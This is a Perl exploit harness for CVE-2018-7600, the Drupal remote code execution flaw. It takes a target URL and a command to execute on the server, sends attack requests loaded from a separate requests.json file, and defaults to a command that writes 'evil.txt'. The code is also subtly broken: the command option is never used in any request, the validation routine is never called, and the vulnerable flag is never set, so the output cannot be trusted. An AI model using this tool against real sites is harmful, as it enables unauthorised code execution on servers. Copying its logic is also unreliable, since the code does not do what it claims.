#!/usr/bin/perl

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use Term::ANSIColor qw(colored color);
use Scalar::Util qw(reftype);
use JSON::Parse qw(json_file_to_perl);
use LWP::UserAgent;
use HTTP::Request;
use HTTP::Cookies;
use HTTP::Response;
use Getopt::Long;

=pod

=head1 CVE-2018-7600

=head2 Date
2018-04-17

=head2 Reporter(s)
José Ignacio Rojo

=head2 Description 

Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x
before 8.5.1 allows remote attackers to execute arbitrary code because
of an issue affecting multiple subsystems with default or common module
configurations.


=cut

# Global Variables
my $DEBUG   = 0;
my $VERBOSE = 0;

# Display The Header
header();

# Run The PoC
exploit();

sub header {
    print "\n\n";
    my $title = "=================================[ CVE-2018-7600 ]=================================";

    print qq{
$title
            
     Reporter : Jose Ignacio Rojo
     Platform : PHP
         Date : 2018-04-17
          CVE : CVE-2018-7600
          CWE : CWE-20
         CVSS : CVSS 7.5

            
Description :


Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x
before 8.5.1 allows remote attackers to execute arbitrary code because
of an issue affecting multiple subsystems with default or common module
configurations.


};
    print "=" x ( length($title) ) . "\n\n";
}

sub exploit_header {
    system("clear");
    print color("red");

    print " " x 16 . " ____     __  __  ____                 ___       __      _     __             ________   ____     __      __     \n";
    print " " x 16 . "/\\  _`\\  /\\ \\/\\ \\/\\  _`\\             /'___`\\   /'__`\\  /' \\  /'_ `\\          /\\_____  \\ /'___\\  /'__`\\  /'__`\\   \n";
    print " " x 16 . "\\ \\ \\/\\_\\\\ \\ \\ \\ \\ \\ \\L\\_\\          /\\_\\ /\\ \\ /\\ \\/\\ \\/\\_, \\/\\ \\L\\ \\         \\/___//'/'/\\ \\__/ /\\ \\/\\ \\/\\ \\/\\ \\  \n";
    print " " x 16 . " \\ \\ \\/_/_\\ \\ \\ \\ \\ \\  _\\L   _______\\/_/// /__\\ \\ \\ \\ \\/_/\\ \\/_> _ <_  _______   /' /' \\ \\  _``\\ \\ \\ \\ \\ \\ \\ \\ \\ \n";
    print " " x 16 . "  \\ \\ \\L\\ \\\\ \\ \\_/ \\ \\ \\L\\ \\/\\______\\  // /_\\ \\\\ \\ \\_\\ \\ \\ \\ \\/\\ \\L\\ \\/\\______\\/' /'    \\ \\ \\L\\ \\ \\ \\_\\ \\ \\ \\_\\ \\\n";
    print " " x 16 . "   \\ \\____/ \\ `\\___/\\ \\____/\\/______/ /\\______/ \\ \\____/  \\ \\_\\ \\____/\\/______/\\_/       \\ \\____/\\ \\____/\\ \\____/\n";
    print " " x 16 . "    \\/___/   `\\/__/  \\/___/           \\/_____/   \\/___/    \\/_/\\/___/         \\//         \\/___/  \\/___/  \\/___/ \n";
    print " " x 16 . "                                                                                                                 \n";
    print " " x 16 . "                                                                                                                 \n";

    print color("green");
    print "\nGithub : https://github.com/gottburgm/\n";
    print "\n\n";
}

sub Help {
    print "\n";
    print qq {  
        # Usage
            perl $0 <USAGE> [OPTIONS]
        
        # Arguments


            --url [VALUE]	: The Target URL [Format: scheme://host]
            --user-agent [VALUE]	: User-Agent To Send To Server
            --cookie [VALUE]	: Cookie String To Use
            --proxy [VALUE]	: Proxy Server To Use [Format: scheme://host:port]
            --timeout [VALUE]	: Max Timeout For The HTTP Requests
            --auth [VALUE]	: Credentials To Use For HTTP Login [Format: username:password]
            --help               : Display The Help Menu
            --verbose               : Be More Verbose
            --debug               : Debug Mode
            --command [VALUE]	: The command to execute .
    };
    print "\n\n";
    exit;
}

sub buildRequester {
    my $browser     = 0;
    my $cookie_jar  = 0;
    my $cookie_file = "cookies.lwp";

    result("Cookie file: $cookie_file");
    $cookie_jar = HTTP::Cookies->new(
        file     => $cookie_file,
        autosave => 1,
    );

    $browser = LWP::UserAgent->new();
    $browser->protocols_allowed( [qw( http https ftp )] );
    $browser->requests_redirectable( [ 'GET', 'PUT', 'DELETE', 'POST', 'HEAD', 'OPTIONS' ] );
    $browser->cookie_jar($cookie_jar);

    return $browser;
}

sub buildRequest {
    my ( $url, $method, $query, $data ) = @_;
    $query = '' if ( !defined($query) || !$query );
    $data  = '' if ( !defined($data)  || !$data );
    $method = uc($method);
    my $request = 0;

    if ($query) {
        $query = '?' . $query;
    }

    if ( $method eq "GET" ) {
        $request = HTTP::Request->new( $method, $url . $query );
    }
    else {
        $request = HTTP::Request->new( $method, $url . $query );
        if ($data) {
            $request->content($data);
            $request->content_length(length($data));
        }
    }

    return $request;
}

sub exploit {
    my $browser       = 0;
    my $request       = 0;
    my $response      = 0;
    my $method        = 0;
    my $content_type  = 0;
    my $base_url      = 0;
    my $base_path     = 0;
    my $path          = '/';
    my $payload       = 0;
    my $vulnerable    = 0;
    my $request_url   = 0;
    my $requests_file = "requests.json";

    my $useragent     = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:54.0) Gecko/20100101 Firefox/54.0";    # Command Argument : user-agent
    my $auth          = 0;                                                                                       # Command Argument : auth
    my $proxy         = 0;                                                                                       # Command Argument : proxy
    my $url           = 0;                                                                                       # Command Argument : url
    my $command       = "echo+\"h3ll\"+|+tee+evil.txt";                                                          # Command Argument : command
    my $timeout       = 30;                                                                                      # Command Argument : timeout
    my $cookie_string = 0;                                                                                       # Command Argument : cookie
    GetOptions(
        "user-agent=s" => \$useragent,
        "debug!"       => \$DEBUG,
        "auth=s"       => \$auth,
        "proxy=s"      => \$proxy,
        "url=s"        => \$url,
        "command=s"    => \$command,
        "verbose!"     => \$VERBOSE,
        "help!"        => \&Help,
        "timeout=i"    => \$timeout,
        "cookie=s"     => \$cookie_string,
    ) or error("Bad Value(s) Provided In Command Line Arguments");

    ### Required Arguments

    die error("Required Argument(s) Missing .") if ( !$url || !$command );

    exploit_header();

    if ( $url =~ /https?:\/\/[^\/]*\/[a-zA-Z0-9\-\.\_\/\\]+/i ) {
        ( $base_url, $base_path ) = $url =~ /(https?:\/\/[^\/]*)(\/[^\?]*)/i;
    }

    ### Setting Up The Requester
    $browser = buildRequester();

    ### Custom Options
    $browser->timeout($timeout);
    $browser->agent($useragent);
    $browser->default_header( 'Cookie' => $cookie_string ) if ($cookie_string);

    if ($proxy) {
        if ( $proxy =~ /[a-z]+:\/\/(?:\d+\.\d+\.\d+\.\d+|[a-zA-Z0-9\-\_]+\.[a-zA-Z\.]+):[0-9]+/i ) {
            result("Proxy: $proxy");
            $browser->proxy( [qw( http https ftp ftps )] => $proxy );
        }
        else {
            error("Wrong Proxy String Given, Use Format : scheme://host:port");
        }
    }

    ### Build/send the requests
    if ( -f $requests_file ) {
        my $requests_data = json_file_to_perl($requests_file);

        foreach my $request_name ( keys %{$requests_data} ) {
            info( $requests_data->{$request_name}->{text} ) if ( defined( $requests_data->{$request_name}->{text} ) && $requests_data->{$request_name}->{text} );

            my $request = buildRequest( $url . $requests_data->{$request_name}->{path}, $requests_data->{$request_name}->{method}, $requests_data->{$request_name}->{query}, $requests_data->{$request_name}->{data} );
#            info($request->method, $request->uri) if ( $VERBOSE || $DEBUG );
            
            if ( defined( $requests_data->{$request_name}->{headers} ) && reftype( $requests_data->{$request_name}->{headers} ) eq 'HASH' ) {
                foreach my $header_name ( sort keys %{ $requests_data->{$request_name}->{headers} }  ) {
                    if ( lc($header_name) eq 'content-type' ) {
                        $request->content_type($requests_data->{$request_name}->{headers}->{$header_name});
                    }
                    else {
                        $request->header($header_name => $requests_data->{$request_name}->{headers}->{$header_name});
                    }
                }
            }

            $response = $browser->request($request);
            displayRequest($response) if ($DEBUG);
        }

        ### Validate or not the test
        if ($vulnerable) {
            print "\n\n" . color("white") . "[" . color("red") . "VULNERABLE" . color("white") . "] " . color("green") . $url . color("white") . " is affected or any kind of validation was provided.\n";
        }
        else {
            print "\n\n" . color("white") . "[" . color("yellow") . "NOT VULNERABLE" . color("white") . "] " . color("green") . $url . color("white") . " is not affected.\n";
        }
    }
    else {
        error("Missing requests file: $requests_file");
    }
}

sub validate {
    my ( $validation_mode, $validation_value, $response ) = @_;
    my $value        = 0;
    my $positive     = 1;
    my $status       = "FAILED";
    my $status_color = "red";
    my $type         = substr( $validation_mode, 1, length($validation_mode) );

    $positive = 0 if ( substr( uc($validation_mode), 0, 1 ) eq 'F' );

    given ( substr( $validation_mode, 1, length($validation_mode) ) ) {

        when (/CODE/i) { $value = $response->code; }

        when (/SIZE/i) { $value = length( $response->content ); }

        when (/STRING|REGEX/i) { $value = $response->content; }

        when (/HEADER/i) {
            my @header_parts = split( ':', $validation_value );

            if ( $header_parts[0] ) {
                if ( $response->header( $header_parts[0] ) ) {
                    if ( $header_parts[1] ) {
                        return $positive if ( $response->header($header_parts[0]) =~ /$header_parts[1]/);
                    }
                    else {
                        return $positive;
                    }
                }
                else {
                    warning( "Expected : " . $header_parts[0] . " Not Found In Response Headers" );
                    return 0;
                }
            }
            else {
                return 0;
            }
        }
    }

    if ( $validation_value && $validation_value =~ /$value/i || $validation_value eq $value ) {
        if ( $VERBOSE || $DEBUG ) {
            if ($positive) {
                $status       = "SUCESS";
                $status_color = "green";

                print color("white") . "   [" . color("magenta") . "V" . color("white") . "]" . color("blue") . "( " . color("$status_color") . $status . color("blue") . " ) [Validation] Expected : " . color("cyan") . "$validation_value" . color("blue") . ", Got : " . color("cyan") . "$value\n";
            }
        }

        return $positive;
    }

    return 0;
}

sub displayRequest {
    my ($response) = @_;
    my $request = $response->request;

    ### Request
    print "\n\n" . color("yellow") . "â¶ " . color("blue") . uc( $request->method ) . color("cyan") . ' ' . $request->uri->path . color("white") . " HTTP/1.1\n";
    print color("yellow") . "â¶ " . color("white") . "Host: " . color("cyan") . $request->uri->host . "\n";

    foreach my $header_name ( keys %{ $request->headers } ) {
        my @headers_values = ();
        push( @headers_values, $request->header($header_name) );

        foreach my $header_value (@headers_values) {
            print color("yellow") . "â¶ " . color("white") . $header_name . ": " . color("cyan") . $header_value . "\n";
        }
    }

    if ( $request->content ) {
        print color("yellow") . "â¶ " . color("white") . $request->content . "\n";
    }
    print "\n\n";

    print color("green") . "<-- " . color("white") . "HTTP/1.1 " . color("cyan") . $response->status_line . "\n";

    foreach my $header_name ( keys %{ $response->headers } ) {
        next if ( $header_name eq '::std_case' );

        my @headers_values = ();
        push( @headers_values, $response->header($header_name) );

        foreach my $header_value (@headers_values) {
            print color("green") . "<-- " . color("white") . $header_name . ": " . color("cyan") . $header_value . "\n";
        }
    }
    print "\n" . color("white") . $response->decoded_content . "\n";
}

sub info {
    if ( $_[0] ) {
        if ( $_[1] ) {
            if ( $_[2] ) {
                print color("blue") . "[" . color("dark blue") . $_[0] . color("blue") . "] " . color("yellow") . $_[1] . color("white") . " " . color("cyan") . " " . $_[2] . "\n";
            }
            else {
                print color("blue") . "[" . color("dark blue") . $_[0] . color("blue") . "] " . color("cyan") . $_[1] . "\n";
            }
        }
        else {
            print colored( "[INFO] ", "blue" ) . color("white") . " " . color("cyan") . $_[0] . "\n";
        }
    }
}

sub result {
    if ( $_[0] ) {
        if ( $_[1] ) {
            if ( $_[2] ) {
                print color("white") . "[" . color("bold green") . "â " . color("dark blue") . $_[0] . color("white") . "]" . color("bold green") . " " . $_[1] . color("white") . ": " . color("cyan") . $_[2] . "\n";
            }
            else {
                print color("white") . "[" . color("bold green") . "â" . color("white") . "]" . color("bold green") . " " . $_[0] . color("white") . ": " . color("cyan") . $_[1] . "\n";
            }
        }
        else {
            print color("white") . "[" . color("bold green") . "â" . color("white") . "]" . color("bold green") . " SUCCESS" . color("white") . ": " . color("cyan") . $_[0] . "\n";
        }
    }
}

sub success {
    my ($text) = @_;
    print color("white") . "[" . color("bold green") . "â" . color("white") . "]" . color("bold green") . " SUCCESS" . color("white") . ": " . color("cyan") . "$text\n";
}

sub warning {
    my ($text) = @_;
    print STDERR color("white") . "[" . color("yellow") . "â¢" . color("white") . "]" . color("yellow") . " WARNING" . color("white") . ": " . color("cyan") . "$text\n";
}

sub error {
    my ( $text, $exit ) = @_;
    $exit = 1 if ( !defined($exit) );
    print STDERR color("white") . "\t\t[" . color("red") . "â" . color("white") . "]" . color("red") . " ERROR" . color("white") . ": " . color("cyan") . "$text\n";
    exit if ($exit);
}
